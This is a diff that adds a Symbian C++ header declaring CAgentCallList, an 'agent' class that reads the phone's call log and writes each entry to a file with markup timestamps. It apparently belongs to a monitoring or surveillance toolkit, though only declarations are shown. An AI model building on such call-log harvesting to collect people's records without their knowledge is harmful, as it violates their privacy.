@@ -1,0 +1,90 @@
+/*
+ * AgentCallList.h
+ *
+ *  Created on: 20/mag/2011
+ *      Author: Giovanna
+ */
+
+#ifndef AGENTCALLLIST_H_
+#define AGENTCALLLIST_H_
+
+// INCLUDES
+
+#include "AbstractAgent.h"
+#include "CallLogReader.h"
+#include <HT\Logging.h>
+
+// CLASS DECLARATION
+
+/**
+ *  CAgentCallList
+ * 
+ */
+class CAgentCallList : public CAbstractAgent, public MCallLogCallBack
+	{
+public:
+	// Constructors and destructor
+
+	/**
+	 * Destructor.
+	 */
+	~CAgentCallList();
+
+	/**
+	 * Two-phased constructor.
+	 */
+	static CAgentCallList* NewL(const TDesC8& params);
+
+	/**
+	 * Two-phased constructor.
+	 */
+	static CAgentCallList* NewLC(const TDesC8& params);
+
+protected:
+	// From AbstractQueueEndPoint
+	virtual void StartAgentCmdL();
+	virtual void StopAgentCmdL();
+		
+private:
+	/**
+	 * Constructor for performing 1st stage construction
+	 */
+	CAgentCallList();
+	
+
+	/**
+	 * EPOC default constructor for performing 2nd stage construction
+	 */
+	void ConstructL(const TDesC8& params);
+	
+	/*
+	 * From MCallLogCallBack
+	 */
+    virtual void HandleCallLogEventL(TInt aDirection,const CLogEvent& aEvent);
+    virtual void CallLogProcessed(TInt aError);
+    
+    /*
+     * Transform the information contained in the item in a buffer.
+     * @return The buffer in proper format, ready to be written in the file.
+     */
+    HBufC8* GetCallLogBufferL(TInt aDirection, const CLogEvent& aEvent);
+    
+    /**
+     * Transform the information contained in the item in a buffer.
+     * @return The buffer in proper format, ready to be written in the file.
+     */
+    HBufC8* GetTTimeBufferL(const TTime aTime);
+
+private:
+	
+    CCallLogReader*		iCallLogReader;
+    
+    TTime iTimestamp;		// used for markup
+    CLogFile* iMarkupFile;
+    
+    __FLOG_DECLARATION_MEMBER
+	
+	};
+
+
+#endif /* AGENTCALLLIST_H_ */
